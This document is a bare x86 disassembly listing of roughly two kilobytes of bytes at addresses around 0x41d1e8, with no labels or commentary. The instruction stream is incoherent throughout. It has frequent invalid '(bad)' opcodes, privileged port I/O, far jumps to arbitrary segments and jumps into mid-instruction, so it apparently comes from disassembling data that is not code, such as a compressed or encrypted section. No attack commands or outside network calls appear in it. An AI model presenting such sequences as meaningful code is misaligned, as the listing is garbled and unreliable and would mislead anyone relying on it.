  41d1e8:	xor    cl,BYTE PTR [esp+ecx*8+0x9]
  41d1ec:	test   eax,0x2ba2ee0f
  41d1f1:	loop   0x41d1c1
  41d1f3:	adc    al,0xd4
  41d1f5:	mov    edx,0x29646bb6
  41d1fa:	mov    ds:0x5cb4a914,eax
  41d1ff:	xchg   edx,eax
  41d200:	push   ebx
  41d201:	push   es
  41d202:	test   eax,0x5f968877
  41d207:	pop    ss
  41d208:	ret    
  41d209:	jmp    0x41d212
  41d20b:	repnz es inc edx
  41d20e:	xor    ecx,esp
  41d210:	out    0x56,eax
  41d212:	cld    
  41d213:	or     esp,DWORD PTR [ebx]
  41d215:	xor    eax,0x2f0b9d2b
  41d21a:	out    0x28,al
  41d21c:	ja     0x41d1b1
  41d21e:	dec    ebx
  41d21f:	(bad)  
  41d221:	div    DWORD PTR [edi]
  41d223:	push   ecx
  41d224:	imul   eax,DWORD PTR [edx-0x54],0xffffffd6
  41d228:	fldcw  WORD PTR [ebx]
  41d22a:	xor    DWORD PTR [eax+ebx*1-0x46],ebp
  41d22e:	push   eax
  41d22f:	out    dx,al
  41d230:	les    edi,FWORD PTR [eax+0x2f]
  41d233:	push   eax
  41d234:	retf   0x8618
  41d237:	push   0x9f9d1b43
  41d23c:	int    0xf1
  41d23e:	in     eax,dx
  41d23f:	rcl    BYTE PTR [ebp-0x33],1
  41d242:	jo     0x41d229
  41d244:	ds push ds
  41d246:	and    ecx,DWORD PTR [ebp+0x366da520]
  41d24c:	mov    cl,0x2d
  41d24e:	xor    BYTE PTR [edi-0x2f8a590c],ch
  41d254:	in     al,dx
  41d255:	xchg   DWORD PTR [ecx+0x18],edi
  41d258:	push   0x54
  41d25a:	jmp    0xe29de75a
  41d25f:	test   esp,ecx
  41d261:	add    bh,0xf
  41d264:	dec    edx
  41d265:	mov    bl,0xfd
  41d267:	jmp    0x41d2b5
  41d269:	call   0x8e5e716
  41d26e:	and    eax,0xcf984758
  41d273:	test   BYTE PTR ds:0xdf80b5f9,cl
  41d279:	jmp    ebp
  41d27b:	or     al,0x65
  41d27d:	xor    esp,edx
  41d27f:	mov    dl,0xa9
  41d281:	push   ebp
  41d282:	dec    ebp
  41d283:	push   ecx
  41d284:	mov    edi,0x5cca195
  41d289:	mov    ecx,0xcd814068
  41d28e:	cmp    bl,bh
  41d290:	lock or BYTE PTR [esi-0xb31fd0c],ah
  41d297:	xchg   DWORD PTR [ebp+0x3dfbfbd2],esp
  41d29d:	ss loopne 0x41d294
  41d2a0:	cmp    al,0x59
  41d2a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d2a3:	xor    BYTE PTR [ecx],ah
  41d2a5:	pop    ebx
  41d2a6:	cli    
  41d2a7:	stos   BYTE PTR es:[edi],al
  41d2a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d2a9:	pop    ds
  41d2aa:	(bad)  
  41d2ab:	xor    edx,DWORD PTR [ebx+0x67]
  41d2ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d2af:	pop    ebx
  41d2b0:	jge    0x41d2e5
  41d2b2:	xchg   ebx,eax
  41d2b3:	arpl   WORD PTR [edi+ecx*2-0x56b2b7da],si
  41d2ba:	ja     0x41d27a
  41d2bc:	aas    
  41d2bd:	push   eax
  41d2be:	retf   0x8651
  41d2c1:	inc    ebx
  41d2c2:	or     cl,BYTE PTR [edx+eiz*4+0x4601b1b0]
  41d2c9:	nop
  41d2ca:	in     eax,0xa2
  41d2cc:	adc    cl,BYTE PTR [ebx-0x75]
  41d2cf:	adc    edx,DWORD PTR [edi+ebp*4+0x21112981]
  41d2d6:	push   esi
  41d2d7:	and    BYTE PTR [esi+edi*2-0x4b2ebcf9],dh
  41d2de:	and    dh,bh
  41d2e0:	not    BYTE PTR [edi]
  41d2e2:	jno    0x41d340
  41d2e4:	and    ecx,ecx
  41d2e6:	push   eax
  41d2e7:	push   esi
  41d2e8:	aam    0xd8
  41d2ea:	xor    eax,0xddc5c935
  41d2ef:	in     al,dx
  41d2f0:	(bad)  
  41d2f1:	xor    eax,0x821bcddd
  41d2f6:	mov    bh,BYTE PTR [ecx+0x4c]
  41d2f9:	sbb    BYTE PTR [ecx+ecx*8-0x4d6c187d],bl
  41d300:	mov    BYTE PTR [eax+0x2603ada7],ah
  41d306:	dec    esp
  41d307:	or     BYTE PTR [ebx+0x50],bh
  41d30a:	xor    dh,al
  41d30c:	je     0x41d2a2
  41d30e:	xor    al,0xd
  41d310:	push   0x34d182db
  41d315:	fistp  QWORD PTR [ebp+0x76]
  41d318:	(bad)  
  41d319:	xor    DWORD PTR [edx+edi*1],ebp
  41d31c:	dec    edx
  41d31d:	pop    edx
  41d31e:	scas   eax,DWORD PTR es:[edi]
  41d31f:	add    ah,bh
  41d321:	lahf   
  41d322:	(bad)  
  41d323:	fdiv   DWORD PTR [ebx]
  41d325:	pop    DWORD PTR [ecx]
  41d327:	sub    al,0x7e
  41d329:	cmp    DWORD PTR [ecx-0x49],eax
  41d32c:	fsubr  st(6),st
  41d32e:	cmp    dh,BYTE PTR ds:0xdc2d808
  41d334:	push   es
  41d335:	pop    esi
  41d336:	ror    ecx,0x19
  41d339:	scas   eax,DWORD PTR es:[edi]
  41d33a:	iret   
  41d33b:	stos   DWORD PTR es:[edi],eax
  41d33c:	repz mov dl,0x94
  41d33f:	add    al,0xfb
  41d341:	mov    eax,0xc422cb99
  41d346:	je     0x41d3b0
  41d348:	lock xor DWORD PTR [edx+0x1a],edi
  41d34c:	sub    eax,0xdb88e331
  41d351:	scas   eax,DWORD PTR es:[edi]
  41d352:	pushf  
  41d353:	mov    bh,0x91
  41d355:	rol    BYTE PTR [ecx+0x1046a2f2],cl
  41d35b:	add    eax,0x18fc137b
  41d360:	ja     0x41d332
  41d362:	icebp  
  41d363:	sbb    al,0x3e
  41d365:	sti    
  41d366:	dec    ebp
  41d367:	clc    
  41d368:	lock jb 0x41d387
  41d36b:	jb     0x41d324
  41d36d:	popf   
  41d36e:	sub    dh,BYTE PTR [edi-0x203c4670]
  41d374:	(bad)  
  41d375:	outs   dx,BYTE PTR ds:[esi]
  41d376:	mov    ch,BYTE PTR [eax]
  41d378:	les    edi,FWORD PTR [eax-0x675c0215]
  41d37e:	cmp    BYTE PTR [edi-0x25],0x52
  41d382:	test   DWORD PTR [esi-0x1a1bcd19],0x463a9c5f
  41d38c:	adc    DWORD PTR ds:0x5569a85b,ebp
  41d392:	aam    0x8d
  41d394:	pop    esi
  41d395:	arpl   WORD PTR [esp+edi*2+0xa909b84],si
  41d39c:	or     dh,BYTE PTR [ebx]
  41d39e:	inc    esp
  41d39f:	xchg   ebx,eax
  41d3a0:	and    eax,0xc846dd93
  41d3a5:	jle    0x41d3d9
  41d3a7:	dec    eax
  41d3a8:	scas   al,BYTE PTR es:[edi]
  41d3a9:	jb     0x41d37e
  41d3ab:	nop
  41d3ac:	retf   0x4016
  41d3af:	xor    eax,0xd41f96bd
  41d3b4:	dec    ebx
  41d3b5:	dec    edx
  41d3b6:	xchg   DWORD PTR [edi],eax
  41d3b8:	les    ebx,FWORD PTR [ebx]
  41d3ba:	mov    esp,0x8ff1a7f6
  41d3bf:	cli    
  41d3c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d3c1:	xor    DWORD PTR [eax-0x26ea5f0f],ebp
  41d3c7:	mov    al,0xb2
  41d3c9:	sub    DWORD PTR [eax+0x56e5041],0xffffff82
  41d3d0:	push   edx
  41d3d1:	xchg   edi,eax
  41d3d2:	ror    BYTE PTR [eax+0x37],cl
  41d3d5:	ja     0x41d409
  41d3d7:	hlt    
  41d3d8:	out    dx,eax
  41d3d9:	sbb    eax,0xb872061d
  41d3de:	cld    
  41d3df:	retf   0xec84
  41d3e2:	retf   
  41d3e3:	push   cs
  41d3e4:	ret    
  41d3e5:	mov    ecx,0xe0a745b2
  41d3ea:	pusha  
  41d3eb:	inc    edi
  41d3ec:	pop    edx
  41d3ed:	fnsave [ecx]
  41d3ef:	dec    esp
  41d3f0:	in     al,dx
  41d3f1:	mov    edi,0x8cc509cf
  41d3f6:	mov    dl,0x9e
  41d3f8:	xchg   edx,eax
  41d3f9:	mov    bh,0xe5
  41d3fb:	loope  0x41d41b
  41d3fd:	leave  
  41d3fe:	into   
  41d3ff:	popf   
  41d400:	pop    eax
  41d401:	inc    ebx
  41d402:	cs sbb esp,edx
  41d405:	xchg   ecx,eax
  41d406:	mov    ecx,0x4a563a36
  41d40b:	mov    dh,0x18
  41d40d:	xor    eax,0x28db0679
  41d412:	pop    eax
  41d413:	mov    ebp,0x4097fdd4
  41d418:	out    0xfc,eax
  41d41a:	and    DWORD PTR ds:0xc1366a1,0x493dee1c
  41d424:	sub    ebx,DWORD PTR [ebx-0xd0362f3]
  41d42a:	cmp    ebp,DWORD PTR [edi+0x19]
  41d42d:	ficom  WORD PTR ds:0x75074b33
  41d433:	xchg   ecx,eax
  41d434:	mov    ch,0x1b
  41d436:	cdq    
  41d437:	sbb    DWORD PTR [ecx+0x4e],ecx
  41d43a:	test   BYTE PTR [eax],0x30
  41d43d:	pop    ds
  41d43e:	sbb    al,0xd0
  41d440:	sbb    eax,0x41016116
  41d445:	bound  ebx,QWORD PTR [ebx+0x5f72ecd4]
  41d44b:	jle    0x41d462
  41d44d:	add    BYTE PTR [eax-0x76],bh
  41d450:	(bad)  
  41d451:	loope  0x41d440
  41d453:	or     edi,DWORD PTR [ecx]
  41d455:	mov    ecx,0xc322b8f2
  41d45a:	add    esp,esp
  41d45c:	sub    ah,ch
  41d45e:	cmp    DWORD PTR [ebx*2-0x579bb7f7],ecx
  41d465:	repnz mov al,ds:0x7d0a3c04
  41d46b:	adc    al,0xc1
  41d46d:	fsub   QWORD PTR [edi+0x18cf1745]
  41d473:	push   edi
  41d474:	xor    DWORD PTR [ebp+0x4e3daaa1],ebx
  41d47a:	sub    eax,0x50ce149f
  41d47f:	arpl   WORD PTR [ebp-0x71bf75b9],si
  41d485:	dec    ebp
  41d486:	call   0x237d8c2a
  41d48b:	jno    0x41d412
  41d48d:	add    al,dh
  41d48f:	xor    eax,edx
  41d491:	mov    edx,0xb7e04448
  41d496:	add    ah,BYTE PTR [eax]
  41d498:	or     DWORD PTR [ebx+0x50],eax
  41d49b:	sub    BYTE PTR [ebx+0x4ac47de8],ah
  41d4a1:	or     ch,BYTE PTR [edi]
  41d4a3:	inc    eax
  41d4a4:	jbe    0x41d492
  41d4a6:	rcr    ecx,cl
  41d4a8:	xor    eax,0xac9a4612
  41d4ad:	int    0xeb
  41d4af:	mov    al,0x83
  41d4b1:	xchg   edi,eax
  41d4b2:	test   DWORD PTR [eax],ebx
  41d4b4:	cwde   
  41d4b5:	sar    DWORD PTR [ebx-0x1f6bb7c],cl
  41d4bb:	xor    al,0x94
  41d4bd:	mov    al,al
  41d4bf:	fbstp  TBYTE PTR [esi+0x5437651f]
  41d4c5:	outs   dx,BYTE PTR ds:[esi]
  41d4c6:	jnp    0x41d523
  41d4c8:	xor    BYTE PTR [ecx],al
  41d4ca:	jp     0x41d45c
  41d4cc:	outs   dx,DWORD PTR ds:[esi]
  41d4cd:	jo     0x41d493
  41d4cf:	ss xor al,0xbf
  41d4d2:	enter  0x7d43,0xa2
  41d4d6:	pop    esi
  41d4d7:	lock outs dx,BYTE PTR ds:[esi]
  41d4d9:	mov    WORD PTR [edi+eiz*8+0x73],es
  41d4dd:	add    BYTE PTR [eax],cl
  41d4df:	adc    DWORD PTR [ebx+0x22],edi
  41d4e2:	mov    ecx,0xb6bc8f14
  41d4e7:	xor    ebp,DWORD PTR [edx]
  41d4e9:	sbb    ch,BYTE PTR ds:0x869480ba
  41d4ef:	jbe    0x41d53b
  41d4f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d4f2:	into   
  41d4f3:	in     al,0x63
  41d4f5:	xchg   BYTE PTR [edi],al
  41d4f7:	dec    edx
  41d4f8:	hlt    
  41d4f9:	jno    0x41d497
  41d4fb:	jmp    0xfbda:0x31ac1703
  41d502:	ret    
  41d503:	jno    0x41d559
  41d505:	and    cl,BYTE PTR [ebp+0x68deeb7e]
  41d50b:	into   
  41d50c:	pop    esi
  41d50d:	cdq    
  41d50e:	fcmovnu st,st(6)
  41d510:	mov    al,ds:0xbb684430
  41d515:	sub    eax,0x83674ef5
  41d51a:	cli    
  41d51b:	les    edx,FWORD PTR [edi]
  41d51d:	daa    
  41d51e:	jge    0x41d4ab
  41d520:	ja     0x41d4be
  41d522:	call   0x57db:0xbf33513e
  41d529:	(bad)  
  41d52a:	sar    ebx,0xd1
  41d52d:	mov    al,ds:0x7c706a3f
  41d532:	ss jo  0x41d57d
  41d535:	mov    ah,0xe6
  41d537:	(bad)  [edi]
  41d539:	xlat   BYTE PTR ds:[ebx]
  41d53a:	jmp    0x41d537
  41d53c:	cmp    BYTE PTR [esi+edi*8],bl
  41d53f:	adc    bh,al
  41d541:	in     eax,dx
  41d542:	mov    ds:0xc93756cf,al
  41d547:	or     BYTE PTR [ecx],ch
  41d549:	stos   DWORD PTR es:[edi],eax
  41d54a:	adc    ecx,ebp
  41d54c:	jnp    0x41d5c0
  41d54e:	add    eax,DWORD PTR [ebx+eax*8+0x13]
  41d552:	push   0x7a29e87c
  41d557:	ins    BYTE PTR es:[edi],dx
  41d558:	xor    al,0xe4
  41d55a:	cmp    edx,DWORD PTR [esi+ebp*8+0x56]
  41d55e:	fisub  WORD PTR ds:0xb13a09b0
  41d564:	push   ebx
  41d565:	stos   DWORD PTR es:[edi],eax
  41d566:	jb     0x41d533
  41d568:	test   esi,ebp
  41d56a:	pop    ss
  41d56b:	adc    bl,BYTE PTR [eax]
  41d56d:	loope  0x41d4fd
  41d56f:	jg     0x41d59b
  41d571:	mov    dh,0xaa
  41d573:	jg     0x41d504
  41d575:	dec    edi
  41d576:	fisttp WORD PTR [eax-0x79f2814e]
  41d57c:	add    ebx,DWORD PTR [esi]
  41d57e:	push   ecx
  41d57f:	jg     0x41d5cc
  41d581:	outs   dx,DWORD PTR ds:[esi]
  41d582:	mov    esi,0x22cdb0f
  41d587:	xchg   esi,eax
  41d588:	inc    edx
  41d589:	test   eax,0xeb76a382
  41d58e:	jmp    0x41d583
  41d590:	or     al,0xcb
  41d592:	rol    dl,1
  41d594:	fild   WORD PTR [ebx]
  41d596:	adc    eax,0xf6b879b9
  41d59b:	call   0xa67dbb6f
  41d5a0:	push   esi
  41d5a1:	cmp    al,BYTE PTR [ecx+0x55]
  41d5a4:	sbb    esi,DWORD PTR [ecx+0x6c3e5862]
  41d5aa:	mov    al,ds:0x8d75ec0a
  41d5af:	mov    dl,0x40
  41d5b1:	fs int 0xdb
  41d5b4:	or     dh,cl
  41d5b6:	cld    
  41d5b7:	and    eax,0x69794d18
  41d5bc:	jae    0x41d554
  41d5be:	ds dec edx
  41d5c0:	fdivrp st(4),st
  41d5c2:	gs and ah,ah
  41d5c5:	adc    esp,DWORD PTR [ebp-0x6c]
  41d5c8:	in     al,0xa3
  41d5ca:	jmp    0x41d5ce
  41d5cc:	jle    0x41d62d
  41d5ce:	popa   
  41d5cf:	and    bl,ah
  41d5d1:	jne    0x41d646
  41d5d3:	inc    ecx
  41d5d4:	adc    edx,DWORD PTR [esi-0x6c]
  41d5d7:	int    0xde
  41d5d9:	xchg   ecx,eax
  41d5da:	cmp    edx,eax
  41d5dc:	loope  0x41d5eb
  41d5de:	or     bl,0x9b
  41d5e1:	push   ebx
  41d5e2:	xchg   ah,cl
  41d5e4:	sbb    edi,DWORD PTR [bx+si+0x6f]
  41d5e8:	fisttp QWORD PTR [ebx]
  41d5ea:	les    ecx,FWORD PTR [ecx-0x4c]
  41d5ed:	xor    BYTE PTR [ebp+0x3e],al
  41d5f0:	out    0x3,al
  41d5f2:	inc    ecx
  41d5f3:	and    ebx,DWORD PTR [edx-0x74]
  41d5f6:	(bad)  
  41d5f7:	test   BYTE PTR [ebp-0x6f],0x3f
  41d5fb:	or     al,0xd9
  41d5fd:	int    0xbd
  41d5ff:	(bad)  
  41d600:	outs   dx,DWORD PTR ds:[esi]
  41d601:	dec    edx
  41d602:	out    0x95,eax
  41d604:	cmp    ecx,DWORD PTR [ecx-0xc]
  41d607:	pop    eax
  41d608:	mov    cl,0x16
  41d60a:	popa   
  41d60b:	fs scas al,BYTE PTR es:[edi]
  41d60d:	js     0x41d68c
  41d60f:	stc    
  41d610:	push   esi
  41d611:	dec    ecx
  41d612:	add    al,0xa9
  41d614:	lahf   
  41d615:	jg     0x41d690
  41d617:	xchg   ebp,eax
  41d618:	xor    eax,0x7df682bc
  41d61d:	loop   0x41d5c9
  41d61f:	add    ebp,DWORD PTR [edi-0x539915f7]
  41d625:	adc    al,0x27
  41d627:	lds    esp,FWORD PTR [ebx+0x58]
  41d62a:	push   edx
  41d62b:	push   es
  41d62c:	push   ebx
  41d62d:	mov    ss,WORD PTR [eax+0x16]
  41d630:	scas   al,BYTE PTR es:[edi]
  41d631:	sub    al,0xaa
  41d633:	mov    ebp,0xeb217396
  41d638:	fist   WORD PTR [edi+esi*8-0x3872d9ff]
  41d63f:	mov    dh,0xde
  41d641:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d642:	stos   BYTE PTR es:[edi],al
  41d643:	push   edx
  41d644:	arpl   di,ax
  41d646:	xor    esi,eax
  41d648:	jl     0x41d626
  41d64a:	cwde   
  41d64b:	adc    edi,ebx
  41d64d:	je     0x41d616
  41d64f:	fs repnz cwde 
  41d652:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d653:	mov    edi,0xa3a80eaf
  41d658:	xchg   ebp,eax
  41d659:	xchg   ecx,eax
  41d65a:	xchg   edi,eax
  41d65b:	add    al,0xf2
  41d65d:	xchg   DWORD PTR [edi-0x1bb353e7],eax
  41d663:	mov    bh,0x58
  41d665:	dec    esp
  41d666:	inc    DWORD PTR ss:[ebx+edx*1-0x41]
  41d66b:	mov    eax,0xa486accb
  41d670:	out    0x20,eax
  41d672:	push   0x5e3e1fdb
  41d677:	or     ah,BYTE PTR [edx+0x1ce872c6]
  41d67d:	xchg   ebx,eax
  41d67e:	out    0x83,eax
  41d680:	lock popf 
  41d682:	stc    
  41d683:	jge    0x41d69a
  41d685:	push   esi
  41d686:	aad    0x1f
  41d688:	jae    0x41d6dd
  41d68a:	cli    
  41d68b:	and    dl,BYTE PTR [ecx+0x3495d605]
  41d691:	iret   
  41d692:	div    DWORD PTR [ebx]
  41d694:	mov    eax,ds:0x32b2444b
  41d699:	repnz mov WORD PTR [esi+0xc],?
  41d69d:	mov    dl,0x71
  41d69f:	jle    0x41d6ba
  41d6a1:	or     BYTE PTR [ecx+0x75cbfb4c],0xc9
  41d6a8:	lea    esi,[ebx-0x26]
  41d6ab:	xlat   BYTE PTR ds:[ebx]
  41d6ac:	cmp    dh,BYTE PTR [edi+0xe]
  41d6af:	aas    
  41d6b0:	jbe    0x41d6fd
  41d6b2:	xchg   BYTE PTR [edx-0x7167880a],bl
  41d6b8:	imul   eax,DWORD PTR [eax+0x21e67a8e],0x4a05202b
  41d6c2:	int    0x87
  41d6c4:	pop    esi
  41d6c5:	daa    
  41d6c6:	js     0x41d6ba
  41d6c8:	mul    DWORD PTR [ebp+0x67f850db]
  41d6ce:	daa    
  41d6cf:	mov    dh,0x15
  41d6d1:	mov    ebp,0x27567060
  41d6d6:	call   0x27d5:0xdb0a73af
  41d6dd:	xchg   edx,eax
  41d6de:	les    ebx,FWORD PTR [edx+0x8]
  41d6e1:	cwde   
  41d6e2:	add    al,0x81
  41d6e4:	lods   eax,DWORD PTR ds:[esi]
  41d6e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d6e6:	(bad)
  41d6e9:	in     eax,0xc8
  41d6eb:	in     al,0xdd
  41d6ed:	jmp    0x9514:0x99b4323e
  41d6f4:	pop    ds
  41d6f5:	mov    al,ds:0x67ab3356
  41d6fa:	mov    cl,0xd8
  41d6fc:	adc    al,0x82
  41d6fe:	mov    edx,0x4b928550
  41d703:	int3   
  41d704:	ja     0x41d697
  41d706:	shl    BYTE PTR [esi+0x30ddbb5b],cl
  41d70c:	rcl    DWORD PTR [eax],0x2
  41d70f:	out    0x49,al
  41d711:	xchg   edi,eax
  41d712:	inc    ebp
  41d713:	jbe    0x41d6cc
  41d715:	test   DWORD PTR [esi+0x1d],esp
  41d718:	arpl   WORD PTR [ebp-0x229357aa],bp
  41d71e:	das    
  41d71f:	jecxz  0x41d6a4
  41d721:	xor    DWORD PTR [edx-0x1907c231],esi
  41d727:	fidivr DWORD PTR [eax-0x5b1c52bc]
  41d72d:	ins    BYTE PTR es:[edi],dx
  41d72e:	or     BYTE PTR ds:0xe02d3d89,bl
  41d734:	call   0xda77ce5
  41d739:	fwait
  41d73a:	ss std 
  41d73c:	pop    ecx
  41d73d:	inc    eax
  41d73e:	hlt    
  41d73f:	cmc    
  41d740:	xor    BYTE PTR [ecx],bh
  41d742:	mov    bh,cl
  41d744:	leave  
  41d745:	jmp    0x41d750
  41d747:	loopne 0x41d6e5
  41d749:	arpl   WORD PTR [edx-0x19fcb9e6],sp
  41d74f:	cmp    edx,DWORD PTR [edx+0x7c]
  41d752:	xchg   ebx,eax
  41d753:	mov    ch,0xfc
  41d755:	and    bl,dh
  41d757:	popa   
  41d758:	push   0xffffffcb
  41d75a:	xchg   BYTE PTR [eax+0x56],bh
  41d75d:	pop    ebx
  41d75e:	jmp    0x41d77f
  41d760:	fmul   DWORD PTR [edx]
  41d762:	pushf  
  41d763:	jge    0x41d6ec
  41d765:	call   DWORD PTR [edi]
  41d767:	fbld   TBYTE PTR [edi]
  41d769:	fidivr DWORD PTR [ecx]
  41d76b:	ja     0x41d727
  41d76d:	mov    edx,0x50fc74b
  41d772:	sub    eax,0x9583fc09
  41d777:	ss cwde 
  41d779:	ins    DWORD PTR es:[edi],dx
  41d77a:	mov    esi,0xa175a3a0
  41d77f:	or     eax,0x67c6e770
  41d784:	push   edi
  41d785:	ret    0x137e
  41d788:	test   BYTE PTR [eax+0x4d9d978],ch
  41d78e:	repz xor DWORD PTR [esi],edx
  41d791:	fidiv  WORD PTR [eax+edi*2-0x2f]
  41d795:	push   ds
  41d796:	adc    DWORD PTR [ebx],esi
  41d798:	stc    
  41d799:	popf   
  41d79a:	pop    esp
  41d79b:	mov    ah,0x72
  41d79d:	push   ds
  41d79e:	or     al,0x1c
  41d7a0:	loopne 0x41d7dc
  41d7a2:	mov    edx,0xae592e3d
  41d7a7:	inc    esp
  41d7a8:	retf   
  41d7a9:	pop    ebp
  41d7aa:	in     al,dx
  41d7ab:	dec    edi
  41d7ac:	lods   eax,DWORD PTR ds:[esi]
  41d7ad:	loope  0x41d7c9
  41d7af:	and    DWORD PTR [ebx],0x77
  41d7b2:	push   ebx
  41d7b3:	cmp    dl,BYTE PTR [ebp+0xcd67feb]
  41d7b9:	jmp    0x41d76b
  41d7bb:	xchg   ebp,eax
  41d7bc:	dec    ecx
  41d7bd:	sahf   
  41d7be:	inc    ecx
  41d7bf:	pop    eax
  41d7c0:	add    DWORD PTR [esi],esi
  41d7c2:	repz (bad) 
  41d7c4:	retf   0xc631
  41d7c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d7c8:	and    al,0x76
  41d7ca:	repz mov ch,0xb1
  41d7cd:	mov    al,ds:0x318b5322
  41d7d2:	xchg   ebx,eax
  41d7d3:	out    0x1,eax
  41d7d5:	retf   0xf496
  41d7d8:	gs ret 
  41d7da:	inc    eax
  41d7db:	aaa    
  41d7dc:	fist   WORD PTR [eax+0x24]
  41d7df:	nop
  41d7e0:	and    BYTE PTR [edx+edx*4],dl
  41d7e3:	loopne 0x41d769
  41d7e5:	xchg   esp,eax
  41d7e6:	add    ebx,DWORD PTR [ebx+0x41]
  41d7e9:	add    dl,BYTE PTR [edi+0x53d4294e]
  41d7ef:	pop    esi
  41d7f0:	jmp    0xf589:0x5cc49486
  41d7f7:	stc    
  41d7f8:	lock jne 0x41d824
  41d7fb:	call   0xb5e1:0xab5facf0
  41d802:	sub    BYTE PTR [ebx+0x2e],cl
  41d805:	sub    eax,0xa5dce0db
  41d80a:	in     eax,dx
  41d80b:	sbb    al,0xad
  41d80d:	ret    0x36f6
  41d810:	mov    ds:0xa25d5cd1,eax
  41d815:	pop    edx
  41d816:	mov    ah,0xd
  41d818:	or     esp,0xffffff9a
  41d81b:	(bad)  
  41d81d:	sbb    BYTE PTR [esi],bl
  41d81f:	pushf  
  41d820:	int    0x76
  41d822:	aas    
  41d823:	adc    al,0xd6
  41d825:	jmp    0x7000:0x1ec0270d
  41d82c:	loop   0x41d85e
  41d82e:	xchg   edi,eax
  41d82f:	pop    ss
  41d830:	shl    DWORD PTR [esp+ebx*4+0x57a85f02],1
  41d837:	cmp    al,0x90
  41d839:	or     ebp,esp
  41d83b:	ret    0x831c
  41d83e:	pusha  
  41d83f:	jbe    0x41d7d4
  41d841:	push   es
  41d842:	inc    esp
  41d843:	nop
  41d844:	or     ecx,eax
  41d846:	pop    edi
  41d847:	pop    edx
  41d848:	aad    0x48
  41d84a:	scas   al,BYTE PTR es:[edi]
  41d84b:	and    DWORD PTR [edx-0x6363d206],eax
  41d851:	pop    ebp
  41d852:	jo     0x41d87d
  41d854:	mov    al,0x31
  41d856:	daa    
  41d857:	ja     0x41d85d
  41d859:	stc    
  41d85a:	and    al,0x2
  41d85c:	cmp    ebx,DWORD PTR [eax-0x5142c3e]
  41d862:	cmp    al,0xa6
  41d864:	daa    
  41d865:	outs   dx,BYTE PTR ds:[esi]
  41d866:	test   eax,0xd49bb4bb
  41d86b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d86c:	xor    BYTE PTR [eax],0x55
  41d86f:	cmp    esp,edx
  41d871:	nop
  41d872:	add    bh,dh
  41d874:	repz ret 0xd4f
  41d878:	das    
  41d879:	pop    edi
  41d87a:	add    dh,al
  41d87c:	xchg   edx,eax
  41d87d:	cmp    BYTE PTR [ecx-0x573e0ceb],al
  41d883:	out    dx,eax
  41d884:	xor    DWORD PTR [esi-0x79],0x4378b696
  41d88b:	pop    ebx
  41d88c:	cs aad 0xf8
  41d88f:	dec    ebx
  41d890:	mov    ds:0xaea52377,al
  41d895:	pop    esp
  41d896:	jo     0x41d87b
  41d898:	inc    esi
  41d899:	mul    BYTE PTR [ecx-0x7a]
  41d89c:	lds    si,DWORD PTR [edx]
  41d89f:	mov    eax,ds:0xbafccd3d
  41d8a4:	dec    ebp
  41d8a5:	fst    QWORD PTR [ecx]
  41d8a7:	push   esi
  41d8a8:	push   esi
  41d8a9:	bound  eax,QWORD PTR [ebx+0x20]
  41d8ac:	(bad)  
  41d8ad:	(bad)  
  41d8ae:	xlat   BYTE PTR ds:[ebx]
  41d8af:	cwde   
  41d8b0:	sbb    al,0x3a
  41d8b2:	sbb    DWORD PTR [edx+0x53],edx
  41d8b5:	mov    eax,ds:0xfebf04c7
  41d8ba:	mov    dh,BYTE PTR [edi+0x2c367f34]
  41d8c0:	div    esp
  41d8c2:	xor    edi,edx
  41d8c4:	(bad)  
  41d8c5:	cmp    dl,0x24
  41d8c8:	sbb    ah,BYTE PTR [edx-0x669dc6cb]
  41d8ce:	xchg   DWORD PTR [edx+ebx*4+0x3875ca58],esi
  41d8d5:	aas    
  41d8d6:	ror    DWORD PTR ds:0xe58d0c26,0xb8
  41d8dd:	loope  0x41d8d1
  41d8df:	ss and al,0x5a
  41d8e2:	xor    al,0x11
  41d8e4:	add    ebx,edx
  41d8e6:	int    0xac
  41d8e8:	mov    bh,0x42
  41d8ea:	retf   
  41d8eb:	out    0x5e,al
  41d8ed:	adc    eax,0x5e3f7697
  41d8f2:	or     al,ch
  41d8f4:	sub    DWORD PTR [esi+eiz*1-0x63afd1e6],esi
  41d8fb:	fldcw  WORD PTR [ebp+0x7e1434d1]
  41d901:	pop    ebx
  41d902:	mov    DWORD PTR [ebp+0x9],0x64922c68
  41d909:	mov    dh,0x3d
  41d90b:	push   0x2a
  41d90d:	lods   eax,DWORD PTR ds:[esi]
  41d90e:	xchg   edi,eax
  41d90f:	repz jo 0x41d8d5
  41d912:	addr16 js 0x41d8a4
  41d915:	(bad)
  41d919:	out    0x72,eax
  41d91b:	jl     0x41d98e
  41d91d:	fstp   TBYTE PTR [ecx+0x74]
  41d920:	std    
  41d921:	mov    WORD PTR [esi-0x4],cs
  41d924:	and    al,BYTE PTR [edx-0x26]
  41d927:	das    
  41d928:	int    0x38
  41d92a:	test   ecx,ecx
  41d92c:	or     bl,0x3b
  41d92f:	loopne 0x41d944
  41d931:	stos   DWORD PTR es:[edi],eax
  41d932:	aaa    
  41d933:	rol    BYTE PTR [edi-0x6b],0x3a
  41d937:	push   0x31
  41d939:	pop    eax
  41d93a:	mov    WORD PTR [eax-0x2],ss
  41d93d:	xchg   edi,eax
  41d93e:	stc    
  41d93f:	aam    0xe2
  41d941:	test   eax,0x78a84bbe
  41d946:	clc    
  41d947:	xchg   esi,eax
  41d948:	in     eax,dx
  41d949:	cmp    eax,0xb121977
  41d94e:	mov    BYTE PTR [edx+0x4b],bl
  41d951:	rcl    BYTE PTR [ecx-0x5c84572d],cl
  41d957:	sti    
  41d958:	and    dh,dh
  41d95a:	shl    DWORD PTR [ebp-0x58],cl
  41d95d:	add    dh,BYTE PTR [ebp-0x10]
  41d960:	mov    ebx,fs
  41d962:	imul   ebp,DWORD PTR cs:[edx-0x10],0x16be7bd1
  41d96a:	xor    cl,BYTE PTR [ebx+0x10]
  41d96d:	inc    ecx
  41d96e:	je     0x41d94d
  41d970:	sbb    ch,ch
  41d972:	lods   al,BYTE PTR ds:[esi]
